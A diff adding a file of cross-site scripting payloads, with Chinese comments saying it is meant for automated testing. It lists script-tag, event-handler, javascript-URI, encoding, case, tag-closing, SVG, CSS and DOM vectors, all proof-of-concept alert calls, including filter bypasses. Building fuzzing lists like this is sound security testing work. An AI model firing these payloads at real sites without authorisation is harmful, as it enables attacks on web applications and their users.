@@ -1,0 +1,92 @@
+# XSS攻击测试Payload
+# 每行一个payload，用于自动化测试
+
+# ==== 基础XSS ====
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+
+# ==== 事件处理器 ====
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<iframe onload=alert(1)>
+<svg onload=alert(1)>
+<marquee onstart=alert(1)>
+<div onmouseover=alert(1)>
+
+# ==== JavaScript伪协议 ====
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)">
+<form action="javascript:alert(1)">
+<img src="javascript:alert(1)">
+
+# ==== 编码绕过 ====
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(49))>
+<script>\u0061lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+
+# ==== 大小写绕过 ====
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<SvG OnLoAd=alert(1)>
+
+# ==== 空格绕过 ====
+<img/src=x/onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe/src=javascript:alert(1)>
+
+# ==== 引号绕过 ====
+<script>alert(String.fromCharCode(49))</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert`1`>
+
+# ==== 标签闭合 ====
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+</title><script>alert(1)</script>
+
+# ==== SVG XSS ====
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1)>
+<svg><set attributeName=onmouseover to=alert(1)>
+
+# ==== HTML5 XSS ====
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# ==== CSS XSS ====
+<style>@import'javascript:alert(1)';</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<style>body{background:url('javascript:alert(1)')}</style>
+
+# ==== DOM XSS ====
+<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+<script>eval(location.hash.slice(1))</script>
+<script>document.write(location.hash)</script>
+
+# ==== 多层编码 ====
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+
+# ==== 框架绕过 ====
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data="javascript:alert(1)">
+
+# ==== 其他向量 ====
+<base href="javascript:alert(1)//">
+<embed src="javascript:alert(1)">
+<math><mi xlink:href="javascript:alert(1)">click
+<form><button formaction="javascript:alert(1)">
+
